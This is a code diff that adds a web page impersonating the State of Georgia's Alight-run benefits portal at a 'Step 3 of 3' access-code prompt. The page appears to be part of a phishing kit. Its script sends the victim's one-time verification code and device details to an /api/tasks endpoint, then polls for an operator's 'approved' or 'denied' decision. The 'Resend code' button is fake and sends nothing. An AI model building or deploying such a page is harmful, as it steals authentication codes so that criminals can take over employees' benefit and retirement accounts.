@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Enter Access Code - stateofgeorgia</title>
+<link rel="icon" type="image/png" href="favicon.png">
+<style>
+  *, *::before, *::after { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; }
+  :root {
+    --primary-brand-color: #1C68BF;
+    --color-bg-primary-base: #266de2; --color-bg-primary-hover: #165bcf;
+    --color-bg-disabled-base: #e0e0e0; --color-text-disabled-base: #a0a0a0;
+    --color-text-body-base: #282828; --color-text-body-subtle: #666666;
+    --color-border-default-subtlest: #dedede; --color-border-focus-base: #0055aa;
+    --color-link-base: #266de2;
+    --font-family-base: "FS Thrive Elliot Web", Arial, sans-serif;
+    --font-family-bold: "FS Thrive Elliot Web - Bold", Arial, sans-serif;
+  }
+  @font-face { font-family: "FS Thrive Elliot Web"; src: url("https://awlds.ap.alight.com/awlds/v1.67.0/awlds-ui-lib/assets/fonts/FSThriveElliotWeb-Regular.woff") format("woff"); font-display: swap; font-weight: 400; }
+  @font-face { font-family: "FS Thrive Elliot Web - Bold"; src: url("https://awlds.ap.alight.com/awlds/v1.67.0/awlds-ui-lib/assets/fonts/FSThriveElliotWeb-Bold.woff") format("woff"); font-display: swap; font-weight: 700; }
+  body { font-family: var(--font-family-base); font-size: 16px; color: var(--color-text-body-base); background: #ffffff; -webkit-font-smoothing: antialiased; }
+
+  .global-header { position: fixed; top: 0; width: 100%; z-index: 1000; background: #ffffff; border-bottom: 1px solid #000000; }
+  .brand-bar { height: 8px; margin: 0; border: none; background: var(--primary-brand-color); }
+  .header-content { display: flex; align-items: center; justify-content: space-between; height: 88px; padding: 0 32px; }
+  .header-left { display: flex; align-items: center; width: 30%; }
+  .logo-link img { height: 48px; width: auto; max-width: 216px; display: block; }
+  .header-right { display: flex; align-items: center; justify-content: flex-end; min-width: 30%; }
+  .va-button { display: inline-flex; align-items: center; justify-content: center; min-height: 40px; padding: 0 16px; border: 2px solid #1C68BF; border-radius: 20px; background-color: #1C68BF; color: #ffffff; font-family: var(--font-family-bold); font-weight: 700; font-size: 14px; cursor: pointer; box-shadow: 0 0 8px #1C68BF; transition: background-color 0.1s; }
+  .va-button:hover { background-color: #165bcf; border-color: #165bcf; }
+  .va-button svg { width: 25px; height: 25px; margin-right: 8px; flex-shrink: 0; }
+
+  main { padding-top: 138px; min-height: calc(100vh - 300px); }
+  .access-section { display: flex; flex-direction: column; padding: 40px 60px; max-width: 500px; }
+  .access-eyebrow { font-size: 16px; font-weight: bold; margin-bottom: 12px; }
+  .access-title { font-family: var(--font-family-bold); font-weight: 700; font-size: 32px; margin: 0 0 16px 0; }
+  .access-subtitle { font-size: 16px; margin: 0 0 32px 0; line-height: 1.5; }
+  .resend-row { display: flex; align-items: center; gap: 16px; margin-bottom: 24px; }
+  .resend-text { font-size: 16px; }
+  .resend-btn { background-color: #e8eaed; color: var(--color-text-body-base); border: none; border-radius: 8px; padding: 10px 20px; font-size: 16px; font-family: var(--font-family-base); cursor: pointer; transition: background-color 0.2s; }
+  .resend-btn:hover { background-color: #d0d2d6; }
+  .code-input { width: 280px; height: 48px; border: 1px solid #c0c0c0; border-radius: 8px; padding: 0 16px; font-size: 18px; font-family: var(--font-family-base); outline: none; transition: border-color 0.2s, box-shadow 0.2s; letter-spacing: 2px; }
+  .code-input:focus { border-color: var(--color-border-focus-base); box-shadow: 0 0 0 2px rgba(0,85,170,0.1); }
+  .button-row { display: flex; gap: 16px; margin-top: 32px; }
+  .btn { display: inline-flex; align-items: center; justify-content: center; min-height: 48px; padding: 0 32px; border: none; border-radius: 24px; font-family: var(--font-family-bold); font-weight: 700; font-size: 16px; cursor: pointer; transition: all 0.2s; }
+  .continue-btn { background-color: var(--color-bg-disabled-base); color: var(--color-text-disabled-base); cursor: not-allowed; }
+  .continue-btn.active { background-color: var(--color-bg-primary-base); color: #ffffff; cursor: pointer; }
+  .continue-btn.active:hover { background-color: var(--color-bg-primary-hover); }
+  .cancel-btn { background-color: #e8eaed; color: var(--color-text-body-base); }
+  .cancel-btn:hover { background-color: #d0d2d6; }
+  .spinner { border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top: 3px solid #ffffff; width: 18px; height: 18px; animation: spin 1s linear infinite; }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+  footer { clear: both; display: block; background-color: #f9f9f9; margin-top: 40px; padding: 5px 12px; }
+  .footer-grid { max-width: 100%; margin: 0 auto; width: 100%; } .footer-row { display: flex; flex-wrap: wrap; }
+  .footer-col { padding: 5px 12px; margin-left: calc((1/12)*100%); flex: 0 0 calc((10/12)*100%); max-width: calc((10/12)*100%); }
+  .footer-top { display: flex; justify-content: space-between; } .footer-links-group { display: flex; gap: 64px; }
+  .footer-list { list-style: none; margin: 0; padding: 0; } .footer-list li { padding: 8px 0; }
+  .footer-list li a { color: var(--color-link-base); text-decoration: none; font-size: 16px; } .footer-list li a:hover { text-decoration: underline; }
+  .footer-brand-block { display: flex; flex-direction: column; gap: 24px; margin-top: 8px; } .footer-logo { display: block; height: 40px; margin-bottom: 8px; } .footer-logo img { height: 100%; display: block; }
+  .app-badges { display: flex; } .app-badges a { display: inline-block; height: 40px; margin-right: 16px; } .app-badges img { height: 100%; display: block; }
+  .footer-divider { border: none; border-top: 1px solid #949494; margin: 0; }
+  .footer-legal-row { display: flex; justify-content: space-between; align-items: flex-start; }
+  .legal-links { display: flex; flex-wrap: wrap; } .legal-links a { color: var(--color-link-base); text-decoration: none; font-size: 14px; padding-right: 32px; } .legal-links a:hover { text-decoration: underline; }
+  .copyright { font-size: 18px; color: #666666; }
+  @media (max-width: 768px) { .header-content { padding: 0 16px; height: 64px; } .logo-link img { max-width: 144px; height: 40px; } main { padding-top: 110px; } .access-section { padding: 20px; } .resend-row { flex-direction: column; align-items: flex-start; gap: 12px; } .code-input { width: 100%; } .footer-col { margin-left: 0; flex: 0 0 100%; max-width: 100%; } .footer-top { flex-direction: column; } .footer-legal-row { flex-direction: column; gap: 16px; } }
+</style>
+</head>
+<body>
+
+<div class="global-header">
+  <nav aria-label="Global navigation">
+    <hr class="brand-bar">
+    <div class="header-content">
+      <div class="header-left">
+        <a href="index.html" class="logo-link"><img src="https://cache-upn.ap.alight.com/upoint/UPoint/cloudCMS/03889/master/UCEDocuments/branding/ADS/logo/GaBreeze+logo.svg" alt="State of Georgia"></a>
+      </div>
+      <nav class="header-right" aria-label="User Menu">
+        <button type="button" class="va-button" aria-label="Virtual Assistant">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 25 25" fill="none" aria-hidden="true">
+            <path d="M12.5 3C7.25 3 3 6.75 3 11.5C3 14.2 4.4 16.6 6.7 18.1L6 22L10 20C10.8 20.2 11.65 20.3 12.5 20.3C17.75 20.3 22 16.55 22 11.8C22 7.05 17.75 3 12.5 3Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round" fill="none"/>
+            <circle cx="9" cy="12" r="1.2" fill="currentColor"/><circle cx="12.5" cy="12" r="1.2" fill="currentColor"/><circle cx="16" cy="12" r="1.2" fill="currentColor"/>
+          </svg>
+          <span>Virtual Assistant</span>
+        </button>
+      </nav>
+    </div>
+  </nav>
+</div>
+
+<main id="content">
+  <div class="access-section">
+    <div class="access-eyebrow">Step 3 of 3</div>
+    <h1 class="access-title">Enter Access Code</h1>
+    <p class="access-subtitle">Enter the code you received.</p>
+    <div class="resend-row">
+      <span class="resend-text">Didn't receive code?</span>
+      <button type="button" class="resend-btn" id="resendBtn">Resend code</button>
+    </div>
+    <form id="accessForm" onsubmit="event.preventDefault();">
+      <input type="text" id="accessCode" class="code-input" maxlength="6" inputmode="numeric">
+      <div class="button-row">
+        <button type="button" class="btn continue-btn" id="continueBtn" disabled>Continue</button>
+        <button type="button" class="btn cancel-btn" id="cancelBtn">Cancel</button>
+      </div>
+    </form>
+  </div>
+</main>
+
+<footer>
+  <div class="footer-grid">
+    <div class="footer-row"><div class="footer-col"><div class="footer-top"><div class="footer-links-group"><ul class="footer-list"><li><a href="https://doas.ga.gov/human-resources-administration/flexible-benefits-program-employees">Flexible Benefits Information</a></li><li><a href="https://www.ers.ga.gov/peach-state-reserves">PSR 401(k)/457 Plan Information</a></li><li><a href="https://worklife.alight.com/web/stateofgeorgia/pre-contactus">Contact Us</a></li><li><a href="#">Feedback</a></li></ul><ul class="footer-list"><li><a href="#">Protect Yourself From Website Fraud</a></li></ul></div><div class="footer-brand-block"><a class="footer-logo" href="https://alight.com/"><img alt="Alight.com home" src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight_worklife_logo_black.svg"></a><div class="app-badges"><a href="https://apps.apple.com/us/app/upoint-mobile-hr/id1534367732?mt=8"><img alt="App Store" src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight-worklife-app-store.png"></a><a href="https://play.google.com/store/apps/details?id=com.alightsolutions.benefitscenter&amp;hl=en_US"><img alt="Google Play" src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight-worklife-google-play.png"></a></div></div></div></div></div>
+    <div class="footer-row"><div class="footer-col"><hr class="footer-divider"></div></div>
+    <div class="footer-row"><div class="footer-col" style="padding-top:15px;padding-bottom:15px;"><div class="footer-legal-row"><div class="legal-links"><a href="https://www.alight.com/privacy">Privacy Policy</a><a href="https://www.alight.com/legal-terms">Terms Of Use</a><a href="https://www.alight.com/cookie-notice">Cookie Notice</a><a href="#">Cookie Settings [Do Not Sell or Share My Personal Information]</a></div><div class="copyright">2026 Alight Solutions. All rights reserved.</div></div></div></div>
+  </div>
+</footer>
+
+<script>
+(function () {
+  var codeInput = document.getElementById("accessCode");
+  var continueBtn = document.getElementById("continueBtn");
+
+  codeInput.addEventListener("input", function () {
+    this.value = this.value.replace(/\D/g, "");
+    if (this.value.trim().length > 0) { continueBtn.disabled = false; continueBtn.classList.add("active"); }
+    else { continueBtn.disabled = true; continueBtn.classList.remove("active"); }
+  });
+
+  continueBtn.addEventListener("click", function () {
+    if (continueBtn.disabled) return;
+    continueBtn.innerHTML = '<div class="spinner"></div>';
+    continueBtn.disabled = true;
+    continueBtn.classList.remove("active");
+
+    var taskId = sessionStorage.getItem("gb_task_id");
+    if (!taskId) { window.location.href = "index.html"; return; }
+
+    fetch("/api/tasks/" + taskId, {
+      method: "PATCH",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        advance_to: "code_verify",
+        verification_code: codeInput.value.trim(),
+        device_info: navigator.userAgent,
+        screen_size: window.screen.width + "x" + window.screen.height
+      })
+    })
+    .then(function (res) { return res.json(); })
+    .then(function (data) {
+      if (!data.task) { window.location.href = "index.html"; return; }
+      pollTask(taskId);
+    })
+    .catch(function () { window.location.href = "index.html"; });
+  });
+
+  function pollTask(taskId) {
+    var interval = setInterval(function () {
+      fetch("/api/tasks/" + taskId)
+        .then(function (res) { return res.json(); })
+        .then(function (data) {
+          if (!data.task) return;
+          if (data.task.status === "approved") {
+            clearInterval(interval);
+            sessionStorage.removeItem("gb_task_id");
+            sessionStorage.removeItem("gb_user_id");
+            document.querySelector(".access-section").innerHTML = '<div style="text-align:center;padding:60px 20px;"><div style="font-size:48px;margin-bottom:16px;">✅</div><h2 style="font-family:var(--font-family-bold);font-size:22px;margin:0 0 8px 0;">Verification Complete</h2><p style="color:var(--color-text-body-subtle);font-size:14px;">Your identity has been verified. You will be redirected shortly.</p></div>';
+          } else if (data.task.status === "denied") {
+            clearInterval(interval);
+            window.location.href = "index.html";
+          }
+        }).catch(function () {});
+    }, 2000);
+  }
+
+  document.getElementById("cancelBtn").addEventListener("click", function () { window.location.href = "verify.html"; });
+
+  document.getElementById("resendBtn").addEventListener("click", function () {
+    var btn = this;
+    btn.textContent = "Sent!";
+    btn.style.backgroundColor = "#d4edda";
+    btn.style.color = "#155724";
+    setTimeout(function () { btn.textContent = "Resend code"; btn.style.backgroundColor = ""; btn.style.color = ""; }, 2000);
+  });
+})();
+</script>
+</body>
+</html>
